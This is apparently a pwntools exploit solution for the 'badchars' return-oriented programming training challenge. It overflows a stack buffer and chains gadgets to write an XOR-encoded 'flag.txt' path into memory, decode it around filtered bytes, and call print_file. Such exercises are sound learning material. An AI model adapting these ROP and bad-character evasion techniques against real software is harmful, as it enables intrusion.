from pwn import *

elf = ELF("badchars")
rop = ROP(elf)

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *pwnme+0x10c
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BADCHARS = [b'x', b'g', b'a', b'.'] # "78|67|61|2E"
BUFFER_SIZE = 32

def is_valid(data):
    return not any(c in data for c in BADCHARS)

def setup(r12=0, r13=0, r14=0, r15=0):
    return flat([rop.r12.address, r12, r13, r14, r15]) # pop r12; pop r13; pop r14; pop r15; ret

def encrypt(data):
    return bytes([~c & 0xff for c in data])

def main():
    toggle_gadget = elf.symbols.usefulGadgets # xor byte ptr [r15], r14b; ret (there's also add and sub)
    write_gadget = elf.symbols.usefulGadgets + 12 # mov qword ptr [r13], r12; ret

    memory = elf.bss(0x800)
    path = b'flag.txt'

    payload = flat \
    ({
        BUFFER_SIZE + context.bytes: \
        [
            # write encrypted file name to memory
            setup(r13=memory, r12=encrypt(path)),
            write_gadget,

            # decrypt each character of the encrypted file name in memory
            [[setup(r15=memory + i, r14=0xff), toggle_gadget] for i in range(len(path))],

            # call target function with file name as arg
            rop.rdi.address, memory,
            elf.symbols.print_file,
        ]
    }, filler=b'\0')
    assert len(payload) <= 0x200 and is_valid(payload)

    c = connection()
    c.sendlineafter(b'> ', payload)
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
